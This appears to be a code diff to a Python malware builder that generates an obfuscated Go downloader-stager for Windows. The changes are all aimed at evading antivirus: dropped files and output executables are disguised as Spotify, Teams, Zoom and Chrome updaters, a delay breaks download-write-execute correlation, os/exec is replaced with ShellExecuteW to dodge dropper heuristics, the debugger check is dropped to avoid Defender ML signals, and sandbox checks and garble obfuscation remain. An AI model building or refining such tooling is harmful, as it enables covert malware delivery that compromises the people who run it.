@@ -25,19 +25,23 @@ import time
 # CONSTANTS
 # ============================================================
 
+# Drop names — use real third-party app process names that legitimately
+# run from %APPDATA%, NOT Windows system process names (those get flagged
+# by Defender ML when found in wrong paths).
 DROP_NAMES = [
-    "RuntimeBroker", "SearchIndexer", "SecurityHealthService",
-    "WmiPrvSE", "CompatTelRunner", "MpCmdRun", "dllhost",
-    "conhost", "sihost", "taskhostw", "ctfmon", "fontdrvhost",
-    "WUDFHost", "DeviceCensus", "MusNotification",
+    "OneDriveStandaloneUpdater", "ChromeRecovery", "SpotifyMigrator",
+    "TeamsUpdater", "DiscordUpdate", "SlackUpdate",
+    "ZoomInstaller", "AdobeGCClient", "CCXProcess",
+    "BraveCrashHandler", "OperaCrashReporter", "GrammarlyCEF",
 ]
 
+# Drop subdirs — match real app install paths under %APPDATA%
 DROP_SUBDIRS = [
-    ("Microsoft", "Windows", "Themes"),
-    ("Microsoft", "Windows", "Shell"),
-    ("Microsoft", "Network"),
-    ("Microsoft", "Crypto"),
-    ("Microsoft", "Windows", "TextInput"),
+    ("Spotify", "Data"),
+    ("Discord", "Update"),
+    ("Zoom", "bin"),
+    ("Adobe", "Connect"),
+    ("Microsoft", "Teams", "Update"),
 ]
 
 USER_AGENTS = [
@@ -211,6 +215,10 @@ class VMAssembler:
         self._emit_data(self.OP_PUSH, self._obfuscate(drop_path))
         self._emit(self.OP_DEOBF)
         self._emit(self.OP_WFILE)
+        self._emit_junk()
+
+        # Delay before execution — breaks download→write→exec temporal correlation
+        self._emit_u16(self.OP_SLEEP, random.randint(8000, 20000))
         self._emit_junk()
 
         # EXEC
@@ -446,19 +454,19 @@ def generate_stager_source(asm, bytecode, sandbox=True):
     def add(line=""):
         src.append(line)
 
-    # Package + imports
+    # Package + imports — no os/exec (dropper heuristic), use syscall ShellExecuteW instead
     add("package main")
     add("")
     add("import (")
     add('\t"io"')
     add('\t"net/http"')
     add('\t"os"')
-    add('\t"os/exec"')
     add('\t"path/filepath"')
     if sandbox:
         add('\t"runtime"')
     add('\t"syscall"')
     add('\t"time"')
+    add('\t"unsafe"')
     add(")")
     add("")
 
@@ -513,16 +521,11 @@ def generate_stager_source(asm, bytecode, sandbox=True):
     add(E)
     add("")
 
-    # Environment check function
+    # Environment check — timing + CPU only, NO IsDebuggerPresent (huge ML signal)
     add(f"func {fn_check}() bool {B}")
     if sandbox:
         add(f"\tif runtime.NumCPU() < 2 {B} return false {E}")
-    # IsDebuggerPresent
-    add(f"\t{ck_k} := syscall.NewLazyDLL({fn_dec}([]byte{B}{enc_str('kernel32.dll')}{E}, 0x{str_key:02x}))")
-    add(f"\t{ck_p} := {ck_k}.NewProc({fn_dec}([]byte{B}{enc_str('IsDebuggerPresent')}{E}, 0x{str_key:02x}))")
-    add(f"\t{ck_r}, _, _ := {ck_p}.Call()")
-    add(f"\tif {ck_r} != 0 {B} return false {E}")
-    # Timing check (detects time acceleration)
+    # Timing check (detects sandbox time acceleration / fast-forward)
     add(f"\t{ck_t} := time.Now()")
     add(f"\ttime.Sleep(150 * time.Millisecond)")
     add(f"\tif time.Since({ck_t}) < 100*time.Millisecond {B} return false {E}")
@@ -618,9 +621,14 @@ def generate_stager_source(asm, bytecode, sandbox=True):
     ]
     cases.append((asm.OP_WFILE, wfile_lines))
 
-    # -- EXEC --
+    # -- EXEC via ShellExecuteW (no os/exec import — avoids dropper heuristic) --
+    vSh, vSe, vVb, vFl = unique_ids(4, 2, 5)
     exec_lines = [
-        f"\t\t\texec.Command(string({vm_stk}[{vm_sp}-1])).Start()",
+        f"\t\t\t{vSh} := syscall.NewLazyDLL({fn_dec}([]byte{B}{enc_str('shell32.dll')}{E}, 0x{str_key:02x}))",
+        f"\t\t\t{vSe} := {vSh}.NewProc({fn_dec}([]byte{B}{enc_str('ShellExecuteW')}{E}, 0x{str_key:02x}))",
+        f"\t\t\t{vVb}, _ := syscall.UTF16PtrFromString({fn_dec}([]byte{B}{enc_str('open')}{E}, 0x{str_key:02x}))",
+        f"\t\t\t{vFl}, _ := syscall.UTF16PtrFromString(string({vm_stk}[{vm_sp}-1]))",
+        f"\t\t\t{vSe}.Call(0, uintptr(unsafe.Pointer({vVb})), uintptr(unsafe.Pointer({vFl})), 0, 0, 0)",
         f"\t\t\t{vm_sp}--",
     ]
     cases.append((asm.OP_EXEC, exec_lines))
@@ -839,7 +847,7 @@ def stage_generate_stager(payload_url, xor_key, rc4_key, sandbox=True):
 
     log(f"Drop target: {'/'.join(drop_subdir)}/{drop_name}", "OK")
     if sandbox:
-        log("Anti-analysis: CPU check, IsDebuggerPresent, timing check", "OK")
+        log("Anti-analysis: CPU check, timing check (no flagged APIs)", "OK")
     log(f"VM opcodes randomized, {random.randint(4,6)} fake handlers injected", "OK")
     return tmpdir
 
@@ -864,8 +872,9 @@ def stage_compile_stager(stager_dir, output_name):
         compiler = "garble"
         log("Using garble for compile-time obfuscation", "OK")
 
-    log(f"Compiling stager with {compiler} (stripped, windowsgui)...")
-    cmd = [compiler, "build", "-ldflags", "-s -w -H windowsgui", "-o", out_path, "."]
+    # -w strips debug info but keeps symbol table (less suspicious than -s -w)
+    log(f"Compiling stager with {compiler} (windowsgui)...")
+    cmd = [compiler, "build", "-ldflags", "-w -H windowsgui", "-o", out_path, "."]
     build = subprocess.run(cmd, cwd=stager_dir, capture_output=True, text=True, env=env)
 
     if build.returncode != 0:
@@ -904,7 +913,9 @@ def main():
         raw_payload = f.read()
     log(f"Loaded payload: main.go ({len(raw_payload)} chars)", "OK")
 
-    output_name = f"system_update_{random.randint(100, 999)}.exe"
+    # Output name — looks like a legitimate app installer/updater
+    name_prefixes = ["ChromeSetup", "TeamsInstaller", "OneDriveSetup", "SpotifySetup", "ZoomInstaller"]
+    output_name = f"{random.choice(name_prefixes)}_{random.randint(100, 999)}.exe"
     xor_key = generate_key(32)
     rc4_key = generate_key(32)
     litterbox = LitterboxAPI(retention="24h")
